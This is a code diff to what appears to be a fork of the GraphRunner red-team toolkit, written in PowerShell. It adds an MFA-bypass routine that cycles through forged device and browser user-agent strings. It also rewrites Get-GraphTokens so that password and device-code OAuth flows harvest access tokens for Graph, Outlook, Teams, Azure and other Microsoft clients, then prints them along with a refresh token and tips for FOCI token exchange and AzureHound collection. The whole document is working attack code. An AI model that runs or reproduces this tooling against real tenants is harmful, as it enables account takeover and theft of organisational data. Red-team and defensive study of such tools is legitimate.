@@ -1846,13 +1846,13 @@ function GraphRunnerBypassMFA {
                 $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
                 
                 # Checking if the global variable $tokens has been set
-                if ($global:tokens -and $global:tokens.access_token) {
-                    Write-Host "Successfully retrieved Graph Access Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
-                    Write-Host "You can use it in the auth menu or via Connect-MgGraph -AccessToken <TOKEN>" -ForegroundColor DarkGreen
-                    Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
-                    Write-Host "Successfully retrieved Refresh Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
-                    Write-Host "Use TokenTacticsV2 (Invoke-RefreshTo...) to exchange it for an Access Token to a FOCI app or directly to collect AzureHound data" -ForegroundColor DarkGreen
-                    Write-Host "Refresh Token: $($global:tokens.refresh_token)" -ForegroundColor DarkMagenta
+                if ($global:tokens -and $global:tokens.AccessTokens.Count -gt 0 -and $global:tokens.access_token) {
+                    # Write-Host "Successfully retrieved Graph Access Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
+                    # Write-Host "You can use it in the auth menu or via Connect-MgGraph -AccessToken <TOKEN>" -ForegroundColor DarkGreen
+                    # Write-Host "Access Token: $($global:tokens.access_token)" -ForegroundColor DarkMagenta
+                    # Write-Host "Successfully retrieved Refresh Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
+                    # Write-Host "Use TokenTacticsV2 (Invoke-RefreshTo...) to exchange it for an Access Token to a FOCI app or directly to collect AzureHound data" -ForegroundColor DarkGreen
+                    # Write-Host "Refresh Token: $($global:tokens.refresh_token)" -ForegroundColor DarkMagenta
                     break OuterLoop  # Exit both loops if a token is retrieved
                 } else {
                     Write-Host "Failed to retrieve token with $device and $browser combination" -ForegroundColor Red
@@ -3563,164 +3563,223 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 https://github.com/dafthack/GraphRunner
 #>
-function Get-GraphTokens{
+function Get-GraphTokens {
     [CmdletBinding()]
     param(
-    [Parameter(Position = 0,Mandatory=$False)]
-    [switch]$ExternalCall,
-    [Parameter(Position = 1,Mandatory=$False)]
-    [switch]$UserPasswordAuth,
-    [Parameter(Position = 2,Mandatory=$False)]
-    [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
-    [String[]]$Client = "MSGraph",
-    [Parameter(Position = 3,Mandatory=$False)]
-    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
-    [Parameter(Position = 4,Mandatory=$False)]
-    [String]$Resource = "https://graph.microsoft.com",
-    [Parameter(Position = 5,Mandatory=$False)]
-    [ValidateSet('Mac','Windows','AndroidMobile','iPhone', 'OS/2', 'PlayStation')]
-    [String]$Device,
-    [Parameter(Position = 6,Mandatory=$False)]
-    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
-    [String]$Browser
+        [Parameter(Position = 0, Mandatory = $False)]
+        [switch]$ExternalCall,
+        [Parameter(Position = 1, Mandatory = $False)]
+        [switch]$UserPasswordAuth,
+        [Parameter(Position = 2, Mandatory = $False)]
+        [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
+        [String[]]$Client,
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+        [Parameter(Position = 4, Mandatory = $False)]
+        [String]$Resource = "https://graph.microsoft.com",
+        [Parameter(Position = 5, Mandatory = $False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone', 'OS/2', 'PlayStation')]
+        [String]$Device,
+        [Parameter(Position = 6, Mandatory = $False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
     )
-    if ($Device) {
-		if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
-		}
-		else {
-			$UserAgent = Invoke-ForgeUserAgent -Device $Device
-		}
-	}
-	else {
-	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
-	   else {
-			$UserAgent = Invoke-ForgeUserAgent
-	   }
-	}
-    if($UserPasswordAuth){
-        Write-Host -ForegroundColor Yellow "[*] Initiating the User/Password authentication flow"
-        
-      
-        $url = "https://login.microsoft.com/common/oauth2/token"
-        $headers = @{
-            "Accept" = "application/json"
-            "Content-Type" = "application/x-www-form-urlencoded"
-            "User-Agent" = $UserAgent
+
+    # If no client provided, prompt interactively
+    if (-not $Client) {
+        Write-Host "Available Clients:"
+        $options = "Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate","All"
+        for ($i = 0; $i -lt $options.Count; $i++) {
+            Write-Host "[$($i+1)] $($options[$i])"
         }
-        $body = "grant_type=password&password=$password&client_id=$ClientID&username=$username&resource=$Resource&client_info=1&scope=openid"
+        $selection = Read-Host "Enter number(s) separated by comma (e.g. 1,3,5) or 'All'"
 
-
-        try{
-            Write-Host -ForegroundColor Yellow "[*] Trying to authenticate with the provided credentials"
-            $tokens = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
-
-            if ($tokens) {
-                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
-                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
-                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
-                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
-                $tokobj = $tokenArray | ConvertFrom-Json
-                
-                Write-Output "Decoded JWT payload:"
-                $tokobj
-                $baseDate = Get-Date -date "01-01-1970"
-                $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
-                Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
-                Write-Host -ForegroundColor Green "User Agent: $UserAgent"
+        if ($selection -match '^(?i)all$') {
+            $Client = $options[0..($options.Count-2)]  # exclude "All"
+        }
+        else {
+            $indices = $selection -split ',' | ForEach-Object { 
+                $s = ($_ -as [int]) 
+                if ($s -and $s -ge 1 -and $s -le $options.Count) { $s - 1 } 
+            } | Where-Object { $_ -ne $null }
+            if (-not $indices) {
+                Throw "No valid client selection made."
             }
-        } catch {
-            $details = $_.ErrorDetails.Message | ConvertFrom-Json
-            Write-Output $details.error
+            $Client = $options[$indices]
         }
-        $global:tokens = $tokens
-        if($ExternalCall){
-            return $tokens
-        }
-    
     }
-    else{
-        If($tokens){
-            $newtokens = $null
-            while($newtokens -notlike "Yes"){
-                Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
-                $answer = Read-Host 
-                $answer = $answer.ToLower()
-                if ($answer -eq "yes" -or $answer -eq "y") {
-                    Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
-                    $global:tokens = ""
-                    $newtokens = "Yes"
-                } elseif ($answer -eq "no" -or $answer -eq "n") {
-                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
-                    return
-                } else {
-                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
-                }
-            }
+
+    # Build User-Agent string (calls your existing helper)
+    if ($Device) {
+        if ($Browser) {
+            $UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+        } else {
+            $UserAgent = Invoke-ForgeUserAgent -Device $Device
+        }
+    } else {
+        if ($Browser) {
+            $UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+        } else {
+            $UserAgent = Invoke-ForgeUserAgent
+        }
+    }
+
+    # Prepare global token structure (store access tokens per client + single refresh token)
+    $global:tokens = [ordered]@{
+        AccessTokens = @{}
+        RefreshToken = $null
+    }
+
+    foreach ($c in $Client) {
+        Write-Host -ForegroundColor Cyan "`n[*] Authenticating for client: $c"
+
+        # Map client to resource (you can adjust resource strings if needed)
+        switch ($c) {
+            "Yammer"               { $resourceForClient = "https://api.yammer.com" }
+            "Outlook"              { $resourceForClient = "https://outlook.office.com" }
+            "MSTeams"              { $resourceForClient = "https://api.spaces.skype.com" }
+            "Graph"                { $resourceForClient = "https://graph.windows.net" }
+            "AzureCoreManagement"  { $resourceForClient = "https://management.core.windows.net/" }
+            "AzureManagement"      { $resourceForClient = "https://management.azure.com/" }
+            "MSGraph"              { $resourceForClient = "https://graph.microsoft.com" }
+            "DODMSGraph"           { $resourceForClient = "https://dod-graph.microsoft.us" }
+            "Custom"               { $resourceForClient = (Read-Host "Enter custom resource URL") }
+            "Substrate"            { $resourceForClient = "https://substrate.office.com" }
+            default                { $resourceForClient = $Resource }
         }
 
-        $body = @{
-            "client_id" =     $ClientID
-            "resource" =      $Resource
-        }
-        $Headers=@{}
-        $Headers["User-Agent"] = $UserAgent
-        $authResponse = Invoke-RestMethod `
-            -UseBasicParsing `
-            -Method Post `
-            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
-            -Headers $Headers `
-            -Body $body
-        Write-Host -ForegroundColor yellow $authResponse.Message
+        $tokens = $null
 
-        $continue = "authorization_pending"
-        while ($continue) {
-            $body = @{
-                "client_id"   = $ClientID
-                "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
-                "code"        = $authResponse.device_code
-                "scope"       = "openid"
+        # -------- Authentication --------
+        if ($UserPasswordAuth) {
+            Write-Host -ForegroundColor Yellow "[*] Initiating the User/Password authentication flow for $c"
+            $url = "https://login.microsoft.com/common/oauth2/token"
+            $headers = @{
+                "Accept" = "application/json"
+                "Content-Type" = "application/x-www-form-urlencoded"
+                "User-Agent" = $UserAgent
             }
+            $body = "grant_type=password&password=$password&client_id=$ClientID&username=$username&resource=$resourceForClient&client_info=1&scope=openid"
 
             try {
-                $tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+                $tokens = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
+            }
+            catch {
+                # Best-effort parse error details; if not present, output the full error
+                try {
+                    $details = $_.ErrorDetails.Message | ConvertFrom-Json
+                    Write-Output $details.error
+                } catch {
+                    Write-Host "Error acquiring tokens for ${c}: $($_.Exception.Message)" -ForegroundColor Red
 
-                if ($tokens) {
-                    $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
-                    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
-                    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
-                    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
-                    $tokobj = $tokenArray | ConvertFrom-Json
-                    $global:tenantid = $tokobj.tid
-                    Write-Output "Decoded JWT payload:"
-                    $tokobj
-                    $baseDate = Get-Date -date "01-01-1970"
-                    $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
-                    Write-Host -ForegroundColor Green 'Successful authentication with UserAgent $UserAgent)'
-                    Write-Host -ForegroundColor Green 'Graph Access Token: $tokens.AccessToken'
-                    Write-Host -ForegroundColor Yellow "[!] Your access token is set to expire on: $tokenExpire"
-                    $continue = $null
                 }
+                # continue to next client
+                continue
+            }
+        }
+        else {
+            # Device Code Flow
+            $body = @{
+                "client_id" = $ClientID
+                "resource"  = $resourceForClient
+            }
+            $Headers = @{ "User-Agent" = $UserAgent }
+            try {
+                $authResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Headers $Headers -Body $body
             } catch {
-                $details = $_.ErrorDetails.Message | ConvertFrom-Json
-                $continue = $details.error -eq "authorization_pending"
-                Write-Output $details.error
+                Write-Host "Error requesting device code for ${c}: $($_.Exception.Message)" -ForegroundColor Red
+                continue
             }
 
-            if ($continue) {
-                Start-Sleep -Seconds 3
-            }
-            else{
-                $global:tokens = $tokens
-                if($ExternalCall){
-                    return $tokens
+            Write-Host -ForegroundColor Yellow $authResponse.Message
+
+            $continue = $true
+            while ($continue) {
+                $body = @{
+                    "client_id"   = $ClientID
+                    "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
+                    "code"        = $authResponse.device_code
+                    "scope"       = "openid"
+                }
+                try {
+                    $tokens = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+                    $continue = $false
+                }
+                catch {
+                    # If authorization_pending, wait and continue; otherwise break and report
+                    try {
+                        $details = $_.ErrorDetails.Message | ConvertFrom-Json
+                        if ($details.error -eq "authorization_pending") {
+                            Start-Sleep -Seconds 3
+                            $continue = $true
+                        } else {
+                            Write-Host "Device flow failed for ${c}: $($details.error)" -ForegroundColor Red
+                            $continue = $false
+                        }
+                    } catch {
+                        Write-Host "Device flow error for ${c}: $($_.Exception.Message)" -ForegroundColor Red
+                        $continue = $false
+                    }
                 }
             }
         }
+
+        # -------- Output & store tokens --------
+        if ($tokens -and $tokens.access_token) {
+            # decode expiry for human-friendly display
+            try {
+                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
+                while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
+                $tokobj = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($tokenPayload)) | ConvertFrom-Json
+                $baseDate = Get-Date -Date "01-01-1970"
+                $tokenExpire = $baseDate.AddSeconds($tokobj.exp).ToLocalTime()
+            } catch {
+                $tokenExpire = "Unknown"
+            }
+
+            Write-Host -ForegroundColor DarkGreen "Successful authentication with UserAgent $UserAgent"
+            Write-Host -ForegroundColor DarkMagenta "[$c] Graph Access Token: $($tokens.access_token)"
+            Write-Host -ForegroundColor Yellow "[!] Access token for $c expires on: $tokenExpire"
+
+            # Save the full access token per client
+            $global:tokens.AccessTokens[$c] = $tokens.access_token
+
+            # Save refresh token internally, but DO NOT print it here
+            if (-not $global:tokens.RefreshToken -and $tokens.refresh_token) {
+                $global:tokens.RefreshToken = $tokens.refresh_token
+            }
+        }
+    }
+
+    # --- If we captured no access tokens, clear global to signal failure ---
+    if (-not $global:tokens.AccessTokens.Keys.Count) {
+        $global:tokens = $null
+    } else {
+        # --- Compatibility aliases for old callers (do NOT print anything) ---
+        if ($global:tokens -and $global:tokens.AccessTokens) {
+            if ($global:tokens.AccessTokens.ContainsKey('MSGraph')) {
+                $global:tokens.access_token = $global:tokens.AccessTokens['MSGraph']
+            } else {
+                $firstAccess = $global:tokens.AccessTokens.GetEnumerator() | Where-Object { $_.Value } | Select-Object -First 1
+                if ($firstAccess) { $global:tokens.access_token = $firstAccess.Value }
+            }
+        }
+
+        # Print refresh token only once at the very end
+        if ($global:tokens -and $global:tokens.RefreshToken) {
+            $global:tokens.refresh_token = $global:tokens.RefreshToken
+            Write-Host "`nSuccessfully retrieved Refresh Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
+            Write-Host "Use TokenTacticsV2 (Invoke-RefreshTo...) to exchange it for an Access Token to a FOCI app or directly to collect AzureHound data" -ForegroundColor DarkGreen
+            Write-Host -ForegroundColor DarkMagenta "[+] Refresh Token: $($global:tokens.RefreshToken)"
+        }
+
+    }
+
+    if ($ExternalCall) {
+        return $global:tokens
     }
 }
+
 
 function Invoke-ForgeUserAgent
 {
